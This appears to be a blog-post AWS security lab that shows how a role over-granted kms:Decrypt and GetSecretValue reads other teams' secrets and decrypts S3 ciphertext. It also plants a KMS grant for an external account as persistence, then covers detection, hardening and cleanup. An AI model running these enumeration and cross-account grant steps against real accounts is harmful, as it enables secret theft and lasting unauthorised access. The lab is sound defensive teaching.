---
layout: post
title: "Lab Secrets Manager and KMS Key Abuse: When One Shared Key Decrypts Everything"
date: 2026-07-08T10:00:00
categories:
  - AWS Security Labs
  - Data Protection lab
tags:
  - aws
  - kms
  - secrets-manager
  - encryption
  - key-policy
  - resource-policy
  - cloud-attack
  - lab
author: muhammed
description: A hands-on lab demonstrating how an over-broad kms:Decrypt and secretsmanager:GetSecretValue grant on a single low-privilege role exposes secrets and ciphertext belonging to completely unrelated applications and how a KMS grant becomes a persistence mechanism that survives IAM credential rotation.
toc: true
pin: false
math: false
mermaid: false
image: https://external-content.duckduckgo.com/iu/?u=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F22d200f8670dbdb3e253a90eee5098477c95c23d%2F2023%2F10%2F03%2Faws_secrets_manager_800x400.png&f=1&nofb=1&ipt=3092218b947cd3c44fdff377d9a9de665f30e5c2cb80fcb371555fea6bea203f
---

## Objective

Start with credentials for a low-privilege "reporting application" role that was granted `kms:Decrypt` and `secretsmanager:GetSecretValue` on every resource in the account  a shortcut taken so the app "could decrypt its own config without anyone having to figure out the exact ARNs."
Use that over-grant to read secrets belonging to two completely unrelated applications, decrypt a ciphertext blob that was never meant for this role, and then plant a KMS grant that keeps decrypt access alive for an external principal even after the original credentials are rotated.
Then fix it with per-application keys, explicit key policies, encryption context conditions, and grant auditing.

**Run this only in an AWS account you own.**

---

## Why a "Fine-Looking" Key Policy Isn't Enough

KMS key policies get reviewed a lot less carefully than they should, because the default one *looks* restrictive  it grants access only to the account's root, which reads like "nobody outside this account can touch it." What that default policy actually does is delegate all real access control to IAM identity-based policies. The key policy is not doing the restricting; your IAM policies are.

That's a confused-deputy setup waiting to happen. If even one role in the account has `kms:Decrypt` on `Resource: *`  a shortcut that's extremely common, because scoping KMS permissions to exact key ARNs is one more thing to get right during setup  that role can decrypt *anything* encrypted under *any* CMK the account owns, not just the one thing it was built for.

This lab is about that gap: a single over-broad grant on a low-value "reporting" role turning into read access on a payments team's Stripe key and HR's third-party API token, plus a way to keep that access alive after the original role is locked down.

---

## Attack Chain

```
Compromised low-privilege identity: reporting-app-role
    │
    │  Step 1: Enumerate every secret the role can reach (secretsmanager:GetSecretValue on *)
    ▼
payments-service/stripe-key + hr-system/adp-api-token exposed
    │  (neither was ever meant to be readable by the reporting app)
    │
    │  Step 2: Enumerate the KMS key backing all three secrets
    │  Step 3: kms:Decrypt used directly against a ciphertext blob in S3
    ▼
Plaintext secrets and config for services this role has nothing to do with
    │
    │  Step 4: kms:CreateGrant — attacker plants a persistent decrypt grant
    │          for an external, attacker-controlled principal
    ▼
Long-lived decrypt access that survives IAM credential rotation entirely
```

---

## Lab Architecture

```
AWS Account: security-lab

IAM Role: reporting-app-role
    Policy (over-broad — real-world shortcut):
      - secretsmanager:GetSecretValue on Resource: *   (should be scoped to its own secret)
      - kms:Decrypt on Resource: *                       (should be scoped to its own CMK)
      - kms:DescribeKey, kms:ListAliases on *

Secrets Manager (all three encrypted under the SAME CMK — the anti-pattern):
  - reporting-app/db-creds         → meant for reporting-app-role only
  - payments-service/stripe-key    → meant for the payments team's service
  - hr-system/adp-api-token        → meant for the HR system integration

KMS: alias/app-secrets-key
    A single shared CMK encrypting all three secrets above, plus an S3 config
    object belonging to the payments service.
    Key policy: AWS default — trusts the account root, delegates everything
    else to IAM identity policies.
```

---

## Phase 0 — Setup

### Step 0.1 — Create the Shared CMK

```bash
aws kms create-key --description "Shared app secrets key (anti-pattern: one key for everything)"
KEY_ID=$(aws kms list-keys --query 'Keys[-1].KeyId' --output text)

aws kms create-alias --alias-name alias/app-secrets-key --target-key-id $KEY_ID
```

### Step 0.2 — Create Three Secrets, All Under the Same Key

```bash
aws secretsmanager create-secret \
  --name reporting-app/db-creds \
  --kms-key-id alias/app-secrets-key \
  --secret-string '{"username":"reporting_ro","password":"Rep0rt!ngRO23"}'

aws secretsmanager create-secret \
  --name payments-service/stripe-key \
  --kms-key-id alias/app-secrets-key \
  --secret-string '{"stripe_secret_key":"sk_live_51H8xREDACTEDpayments"}'

aws secretsmanager create-secret \
  --name hr-system/adp-api-token \
  --kms-key-id alias/app-secrets-key \
  --secret-string '{"adp_api_token":"tok_live_adpREDACTEDsensitive"}'
```

### Step 0.3 — Encrypt a Config Blob in S3 Under the Same CMK

```bash
cat > payments-config.json << 'EOF'
{
  "stripe_restricted_key": "rk_live_51H8xREDACTEDwebhook",
  "webhook_signing_secret": "whsec_REDACTEDsigningsecret"
}
EOF

aws s3 mb s3://payments-configs-lab-demo
aws s3 cp payments-config.json s3://payments-configs-lab-demo/prod/config.json \
  --sse aws:kms --sse-kms-key-id alias/app-secrets-key
```

### Step 0.4 — Create the Over-Privileged Reporting Role

```bash
cat > reporting-app-policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {"Effect": "Allow", "Action": "secretsmanager:GetSecretValue", "Resource": "*"},
    {"Effect": "Allow", "Action": ["kms:Decrypt", "kms:DescribeKey", "kms:ListAliases"], "Resource": "*"}
  ]
}
EOF

aws iam create-role --role-name reporting-app-role --assume-role-policy-document file://order-processor-trust.json
aws iam put-role-policy --role-name reporting-app-role --policy-name reporting-app-inline --policy-document file://reporting-app-policy.json
```

IAM console showing `reporting-app-role`'s inline policy with `secretsmanager:GetSecretValue` and `kms:Decrypt` both scoped to `Resource: *`

Assume this role to simulate the attacker who has obtained its credentials.

---

## Phase 1 — Enumerate Every Secret the Role Can Reach

```bash
aws secretsmanager list-secrets --query 'SecretList[].Name'
```

```
[
    "reporting-app/db-creds",
    "payments-service/stripe-key",
    "hr-system/adp-api-token"
]
```

The role has no business need to touch anything but its own database credentials  but the IAM policy doesn't say that anywhere.

```bash
aws secretsmanager get-secret-value --secret-id payments-service/stripe-key --query SecretString --output text
aws secretsmanager get-secret-value --secret-id hr-system/adp-api-token --query SecretString --output text
```

```json
{"stripe_secret_key":"sk_live_51H8xREDACTEDpayments"}
{"adp_api_token":"tok_live_adpREDACTEDsensitive"}
```

`aws secretsmanager get-secret-value` against `payments-service/stripe-key`, returning plaintext from `reporting-app-role`'s credentials

**GuardDuty finding:**

```
Exfiltration:IAMUser/AnomalousBehavior
```

GuardDuty's identity anomaly detection baselines which API calls and resources each principal normally touches. `reporting-app-role` calling `GetSecretValue` against secrets it has never accessed before  belonging to two different teams  is exactly the kind of behavioral deviation this finding family is built to catch.

---

## Phase 2 — Enumerate the KMS Key Behind Everything

```bash
aws kms list-aliases --query "Aliases[?AliasName=='alias/app-secrets-key']"
aws kms describe-key --key-id alias/app-secrets-key
aws kms get-key-policy --key-id alias/app-secrets-key --policy-name default
```

The key policy returned is the AWS default:

```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Sid": "Enable IAM User Permissions",
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
    "Action": "kms:*",
    "Resource": "*"
  }]
}
```

This is the confused deputy laid bare: the key policy itself names nothing more specific than "the account root," which reads as safe. But it means *every* IAM policy in the account is the real gatekeeper  and one of them, `reporting-app-role`'s, grants `kms:Decrypt` on everything. The key never distinguished between "the reporting app" and "anyone in this AWS account with a `kms:Decrypt` allow statement."

 `aws kms get-key-policy` output showing the unmodified default policy — no explicit principal restriction beyond the account root

---

## Phase 3 — Decrypt Ciphertext That Was Never Meant for This Role

`kms:Decrypt` on the shared key doesn't just expose the three Secrets Manager entries  it exposes *anything at all* encrypted under `alias/app-secrets-key`, including the S3 config blob from Step 0.3.

```bash
aws s3 cp s3://payments-configs-lab-demo/prod/config.json ./config.json.enc

aws kms decrypt \
  --ciphertext-blob fileb://config.json.enc \
  --output text --query Plaintext | base64 --decode
```

```json
{
  "stripe_restricted_key": "rk_live_51H8xREDACTEDwebhook",
  "webhook_signing_secret": "whsec_REDACTEDsigningsecret"
}
```

 decrypted plaintext from an S3 object belonging to the payments service, obtained entirely through `reporting-app-role`'s KMS access  no S3 permissions on that bucket were even required beyond `s3:GetObject`, because SSE-KMS decryption happens via the KMS grant, not an S3-level ACL

**GuardDuty finding:**

```
CredentialAccess:IAMUser/AnomalousBehavior
```

A burst of `kms:Decrypt` calls against ciphertext outside this identity's normal resource footprint is flagged the same way the Secrets Manager access was — the anomaly is in the *pattern* of KMS usage, not any single call being individually "wrong."

---

## Phase 4 — Persistence via a KMS Grant

Rather than relying on `reporting-app-role`'s credentials  which might get rotated or revoked once the compromise is noticed  the attacker plants a grant on the CMK for an external, attacker-controlled principal:

```bash
aws kms create-grant \
  --key-id alias/app-secrets-key \
  --grantee-principal arn:aws:iam::999999999999:role/attacker-controlled-role \
  --operations Decrypt DescribeKey
```

```json
{
  "GrantId": "0f1e2d3c4b5a...",
  "GrantToken": "AQpAM2RjNGI1YTZmN2U4ZDk..."
}
```

 `aws kms create-grant` output showing a `GrantId` issued for an external account's role

This is the part of the lab that matters most for incident response: **KMS grants don't appear in the key policy.** Reviewing `get-key-policy` after this attack shows the exact same default policy as before  nothing looks different. The only way to see the grant is to explicitly list them:

```bash
aws kms list-grants --key-id alias/app-secrets-key
```

```json
{
  "Grants": [{
    "GranteePrincipal": "arn:aws:iam::999999999999:role/attacker-controlled-role",
    "Operations": ["Decrypt", "DescribeKey"],
    "GrantId": "0f1e2d3c4b5a..."
  }]
}
```

Even after `reporting-app-role`'s credentials are rotated and the role itself deleted, the external account's role keeps `Decrypt` access to everything encrypted under this CMK, because the grant is a separate authorization path that doesn't depend on the identity that created it still existing.

**GuardDuty finding:**

```
Persistence:IAMUser/AnomalousBehavior
```

`kms:CreateGrant` naming an external account as grantee is a rare, high-signal action in most environments  exactly the kind of persistence-tactic anomaly this finding family is designed to surface.

---

## Phase 5 — Hardening

### Fix 1 — One CMK Per Application, Not One Shared Key

```bash
aws kms create-key --description "reporting-app dedicated key"
aws kms create-alias --alias-name alias/reporting-app-key --target-key-id <new-key-id>

aws kms create-key --description "payments-service dedicated key"
aws kms create-alias --alias-name alias/payments-service-key --target-key-id <new-key-id>
```

Re-encrypt each secret under its own application's key. A compromised `reporting-app-role` can now decrypt only what `reporting-app/db-creds` was ever encrypted under  the blast radius stops at the boundary of one application, by construction, rather than by hoping the IAM policy is exactly right.

### Fix 2 — Scope IAM Grants to Specific ARNs

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {"Effect": "Allow", "Action": "secretsmanager:GetSecretValue", "Resource": "arn:aws:secretsmanager:*:*:secret:reporting-app/db-creds-*"},
    {"Effect": "Allow", "Action": "kms:Decrypt", "Resource": "arn:aws:kms:*:*:key/REPORTING-APP-KEY-ID"}
  ]
}
```

Never grant `kms:Decrypt` or `secretsmanager:GetSecretValue` on `Resource: *`  it should be exceptional enough to justify a code review comment when it happens.

### Fix 3 — Restrict the Key Policy Itself, Don't Rely on IAM Alone

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "AccountAdminAccess",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123456789012:root"},
      "Action": "kms:*",
      "Resource": "*"
    },
    {
      "Sid": "AllowOnlyReportingAppToDecrypt",
      "Effect": "Allow",
      "Principal": {"AWS": "arn:aws:iam::123456789012:role/reporting-app-role"},
      "Action": ["kms:Decrypt", "kms:DescribeKey"],
      "Resource": "*"
    },
    {
      "Sid": "DenyGrantCreationExceptKeyAdmins",
      "Effect": "Deny",
      "NotPrincipal": {"AWS": "arn:aws:iam::123456789012:role/kms-key-admin-role"},
      "Action": "kms:CreateGrant",
      "Resource": "*"
    }
  ]
}
```

Explicitly naming which principals may use the key  and explicitly denying `kms:CreateGrant` to everyone except a dedicated key-admin role  closes off the persistence path from Phase 4 even if an application role's IAM policy is later over-broadened by mistake again.

### Fix 4 — Bind Decrypt Access to Encryption Context

```python
import boto3
kms = boto3.client("kms")

# Encrypt with a context tag identifying the owning application
kms.encrypt(
    KeyId="alias/app-secrets-key",
    Plaintext=b"...",
    EncryptionContext={"app": "reporting-app"}
)
```

```json
{
  "Effect": "Allow",
  "Action": "kms:Decrypt",
  "Resource": "arn:aws:kms:*:*:key/SHARED-KEY-ID",
  "Condition": {
    "StringEquals": {"kms:EncryptionContext:app": "reporting-app"}
  }
}
```

Even on a shared key, this condition means `reporting-app-role` can only decrypt ciphertext that was encrypted with `EncryptionContext={"app": "reporting-app"}`  the payments and HR secrets, encrypted with their own context values, become mathematically undecryptable by this role regardless of what the IAM `Resource` field says.

### Fix 5 — Audit and Restrict Grants Specifically

```bash
# Run periodically across every CMK — grants are invisible in the key policy
for key in $(aws kms list-keys --query 'Keys[].KeyId' --output text); do
  aws kms list-grants --key-id $key
done
```

Wire `kms:CreateGrant` into the same EventBridge alerting used for logging tampering in the previous lab  it's rare enough in most accounts that any occurrence outside of expected automation deserves immediate review.

### Fix 6 — Add Resource Policies on the Secrets Themselves

```bash
aws secretsmanager put-resource-policy \
  --secret-id payments-service/stripe-key \
  --resource-policy '{
    "Version": "2012-10-17",
    "Statement": [{
      "Effect": "Deny",
      "Principal": "*",
      "Action": "secretsmanager:GetSecretValue",
      "Resource": "*",
      "Condition": {
        "StringNotEquals": {"aws:PrincipalArn": "arn:aws:iam::123456789012:role/payments-service-role"}
      }
    }]
  }'
```

A resource policy on the secret is a second, independent gate  even if an application role's IAM policy is over-broadened again in the future, the secret itself refuses to be read by anyone other than its named owner.

---

## Key Takeaways

- The AWS default KMS key policy looks restrictive but isn't it trusts the account root and delegates all real access control to IAM identity policies, so one over-broad `kms:Decrypt` grant defeats it for everything encrypted under that key
- Sharing a single CMK across multiple applications means a compromise of any one over-privileged identity can decrypt everything under it, not just what that identity is supposed to touch  one key per application is a blast-radius decision, not a convenience decision
- `kms:CreateGrant` is a persistence mechanism that survives IAM credential rotation and role deletion, and it doesn't show up when reviewing a key's resource policy  `kms:ListGrants` needs to be part of routine hygiene and incident response, not an afterthought
- Encryption context conditions bind a decrypt permission to the specific data the caller should be allowed to touch, functioning as real defense-in-depth even when the IAM policy behind it is broader than it should be
- Key policies and Secrets Manager resource policies should explicitly allow-list principals rather than relying on IAM identity policies as the only gate  belt-and-suspenders against exactly this kind of over-grant

---

## Cleanup

```bash
aws secretsmanager delete-secret --secret-id reporting-app/db-creds --force-delete-without-recovery
aws secretsmanager delete-secret --secret-id payments-service/stripe-key --force-delete-without-recovery
aws secretsmanager delete-secret --secret-id hr-system/adp-api-token --force-delete-without-recovery

aws s3 rb s3://payments-configs-lab-demo --force

GRANT_ID=$(aws kms list-grants --key-id alias/app-secrets-key --query 'Grants[0].GrantId' --output text)
aws kms revoke-grant --key-id alias/app-secrets-key --grant-id $GRANT_ID

aws kms disable-key --key-id alias/app-secrets-key
aws kms schedule-key-deletion --key-id alias/app-secrets-key --pending-window-in-days 7

aws iam delete-role-policy --role-name reporting-app-role --policy-name reporting-app-inline
aws iam delete-role --role-name reporting-app-role
```

---

## You can find me online at:

![My signature image](/assets/img/footer-signature.png)

- **GitHub:** [Mhdomer](https://github.com/Mhdomer)
- **LinkedIn:** [mhd3omar](https://www.linkedin.com/in/mhd3omar/)
- **Tryhackme:** [nonlouy](https://tryhackme.com/p/nonlouy)
